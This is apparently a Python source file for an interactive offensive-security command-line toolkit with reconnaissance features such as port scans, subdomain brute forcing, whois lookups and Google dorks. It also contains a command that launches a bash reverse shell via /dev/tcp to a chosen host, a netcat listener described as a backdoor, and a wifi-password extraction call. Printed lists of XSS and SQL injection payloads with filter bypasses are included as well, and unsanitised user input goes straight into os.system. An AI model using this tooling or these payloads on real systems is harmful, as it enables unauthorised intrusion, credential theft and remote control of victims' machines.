import os
import requests
import base64
import platform
import webbrowser
from base64 import urlsafe_b64encode, urlsafe_b64decode

from requests.models import encode_multipart_formdata


banner = """
 @@@@@@@  @@@@@@@@ @@@@@@@        @@@@@@ @@@@@@@@  @@@@@@@ @@@  @@@ @@@@@@@  @@@ @@@@@@@ @@@ @@@
 @@!  @@@ @@!      @@!  @@@      !@@     @@!      !@@      @@!  @@@ @@!  @@@ @@!   @@!   @@! !@@
 @!@  !@! @!!!:!   @!@  !@!       !@@!!  @!!!:!   !@!      @!@  !@! @!@!!@!  !!@   @!!    !@!@! 
 !!:  !!! !!:      !!:  !!!          !:! !!:      :!!      !!:  !!! !!: :!!  !!:   !!:     !!:  
 :: :  :  : :: ::: :: :  :       ::.: :  : :: :::  :: :: :  :.:: :   :   : : :      :      .:   
                                                                                                
"""

print(banner)

google_hacking = 'https://www.google.com/search?q='

def help():
    print("""
exit - To exit
clear - Linux
cls - Windows 
robots - Get robots.txt  
speciport - Shows specific ports 
curl - Website source code
banner - Banner-Grabbing
portscan - Port-Scanner 
wifi - This software obtains the wifi passwords saved on the computer
subdomain - Shows the subdomains
whois - Consult contact information and DNS about entities on the internet
geoip - Feature that allows you to determine the geographic position of a device based on a coordinate system
traceroute - Traceroute is a diagnostic tool that tracks a packet's route through a computer network using IP and ICMP protocols
ping - Utility that uses the ICMP protocol to test connectivity between devices
google - Google Hacking
exploitdb - Google Hacking Database
login - Pages containing login portals
ondevice - Online devices
indexof - Index of a website
dmarc - Is a standard email authentication method. ... These reports contain information that identifies potential authentication issues and malicious activity in messages sent from your domain.
dirb - Brute force with multiple mass names and handles their return code identifying whether they are returned or not
listeningport - listening port to backdoor
dedsecurity - Ded Security Website
xss - Xss codes
reverseshell - Bash reverse shell
sqlinjection - Sql injection codes
encode - Base64 Encoder
decode - Base64 Decoder
""")

def subdomain():
    domain = input("Website: ")

    file = open("network/listsubdomain.txt")
    content = file.read()
    subdomains = content.splitlines()

    discovered_subdomains = []
    for subdomain in subdomains:
        
        url = f"http://{subdomain}.{domain}"
        try:   
            requests.get(url)
        except requests.ConnectionError:
            
            pass
        else:
            
            print("subdomain:", url)
            discovered_subdomains.append(url)

def traceroute():
    t = input("Website/Ip: ")
    if platform.system() == 'Linux':
        os.system("traceroute "+t)
    elif platform.system() == 'Windows':
        os.system("tracert "+t)


def encode(data):
    return urlsafe_b64encode(bytes(data, 'utf-8'))

def decode(enc):
    return urlsafe_b64decode(enc).decode()

print("Type 'help' to show commands.")

while True:
    i = input("\033[36mdedsecurity> \033[m")

    if i == "exit":
        break
    elif i == "clear":
        os.system("clear")
    elif i == "cls":
        os.system("cls")
    elif i == "help":
        help()
    elif i == "robots":
        v = input("Website: ")
        robots = 'http://'+v+'/robots.txt'
        info = requests.get(robots)
        print(info.text)
    elif i == "speciport":
        p = input("Website/ip: ")
        os.system('python network/speciport.py '+p)# if you use Linux, switch to 'python3 network/speciport.py'
    elif i == "curl":
        c = input("Website[example:https://google.com]: ")
        os.system('deno run --allow-net network/curl.ts '+c)
    elif i == "banner":
        os.system('python network/banner_grabbing.py')# if you use Linux, switch to 'python3 network/banner_grabbing.py'
    elif i == "portscan":
        os.system('python network/scannernmap.py')# if you use Linux, switch to 'python3 network/scannernmap.py'
    elif i == "wifi":
        os.system('python network/wifi.pyw')# if you use Linux, switch to 'python3 network/wifi.pyw'
    elif i == "subdomain":
        subdomain()
    elif i == "whois":
        w = input("Website:")
        whois = 'https://api.hackertarget.com/whois/?q='+w
        info = requests.get(whois)
        print(info.text)
    elif i == "geoip":
        g = input("Website/Ip: ")
        geoip = 'https://api.hackertarget.com/geoip/?q='+g
        info = requests.get(geoip)
        print(info.text)
    elif i == "traceroute":
        traceroute()
    elif i == "ping":
        pi = input("Website/Ip: ")
        os.system("ping "+pi)
    elif i == "google":
        url = input("Website: ")
        webbrowser.open_new_tab(google_hacking + 'site:'+url)
    elif i == "exploitdb":
        webbrowser.open_new_tab('https://www.exploit-db.com/google-hacking-database')
    elif i == "login":
        lo = input("Website: ")
        webbrowser.open_new_tab(google_hacking + 'inurl:"/login.htm" site:'+lo)
    elif i == "ondevice":
        on = input("Website: ")
        webbrowser.open_new_tab(google_hacking + 'site:'+on+' /tcpipv4.htm')
    elif i == "indexof":
        index = input("Website: ")
        webbrowser.open_new_tab(google_hacking + 'intitle: "index of" site:'+index)
    elif i == "dmarc":
        dmarc = input("Url: ")
        os.system("host -t txt _dmarc."+dmarc)
    elif i == "dirb":
        urldirb = input("Url: ")
        os.system("dirb "+urldirb)
    elif i == "listeningport":
        ip = input("Ip: ")
        port = input("Port: ")
        os.system("sudo nc -l "+ip+" -p "+port+" -v")
    elif i == "dedsecurity":
        webbrowser.open_new_tab('https://www.dedsecurity.com')
    elif i == "reverseshell":
        ip = input("Ip: ")
        port = input("Port: ")
        os.system("bash -c 'exec bash -i &>/dev/tcp/"+ip+"/"+port+" <&1'")
    elif i == "xss":
        print("""
        XSS in HTML/Applications
        
        Basic Payload

        <script>alert('XSS')</script>
        <s
        cr<script>ipt>alert('XSS')</scr<script>ipt>
        "><script>alert("XSS")</script>
        "><script>alert(String.fromCharCode(88,83,83))</script>
        
        Img tag payload
        
        <img src=x onerror=alert('XSS');>
        <img src=x onerror=alert('XSS')//
        <img src=x onerror=alert(String.fromCharCode(88,83,83));>
        <img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
        <img src=x:alert(alt) onerror=eval(src) alt=xss>
        "><img src=x onerror=alert("XSS");>
        "><img src=x onerror=alert(String.fromCharCode(88,83,83));>

        XSS in SVG (short)

        <svg xmlns='http://www.w3.org/2000/svg' onload='alert(document.domain)'/>
        <svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
        <svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>
        <svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>

        Bypass word blacklist with code evaluation

        eval('ale'+'rt(0)');
        Function('ale'+'rt(1)')();
        new Function`alert`6``;
        setTimeout('ale'+'rt(2)');
        setInterval('ale'+'rt(10)');
        Set.constructor('ale'+'rt(13)')();
        Set.constructor`alert(14)```;
        """)
    elif i == "sqlinjection":
        print("""
        Generic SQL Injection Payloads

        ' or '
        -- or # 
        ' OR '1
        ' OR 1 -- -
        OR "" = "
        " OR 1 = 1 -- -"
        ' OR '' = '
        '='
        'LIKE'
        '=0--+
        OR 1=1
        ' OR 'x'='x
        ' AND id IS NULL; --
        '''''''''''''UNION SELECT '2

        Time-Based

        ,(select * from (select(sleep(10)))a)
        %2c(select%20*%20from%20(select(sleep(10)))a)
        ';WAITFOR DELAY '0:0:30'--
        Generic Error Based Payloads
        OR 1=1
        OR 1=1#
        OR x=y#
        OR 1=1-- 
        OR x=x-- 
        OR 3409=3409 AND ('pytW' LIKE 'pytW
        HAVING 1=1
        HAVING 1=1#
        HAVING 1=0-- 
        AND 1=1-- 
        AND 1=1 AND '%'='
        WHERE 1=1 AND 1=0--
        %' AND 8310=8310 AND '%'='

        Authentication Based Payloads

        ' or ''-'
        ' or '' '
        ' or ''&'
        ' or ''^'
        ' or ''*'
        or true--
        " or true--
        ' or true--
        ") or true--
        ') or true--
        admin') or ('1'='1'--
        admin') or ('1'='1'#
        admin') or ('1'='1'/

        Order by and UNION Based Payloads

        1' ORDER BY 1--+
        1' ORDER BY 2--+
        1' ORDER BY 3--+
        1' ORDER BY 1,2--+
        1' ORDER BY 1,2,3--+
        1' GROUP BY 1,2,--+
        1' GROUP BY 1,2,3--+
        ' GROUP BY columnnames having 1=1 --
        -1' UNION SELECT 1,2,3--+
        ' UNION SELECT sum(columnname ) from tablename --
        -1 UNION SELECT 1 INTO @,@
        -1 UNION SELECT 1 INTO @,@,@
        1 AND (SELECT * FROM Users) = 1 
        ' AND MID(VERSION(),1,1) = '5';
        ' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --
        """)
    elif i == "encode":
        msg = input("msg: ")
        encode(msg)
        print(encode(msg))
    elif i == "decode":
        msgde = input("msg: ")
        decode(msgde)
        print(decode(msgde))



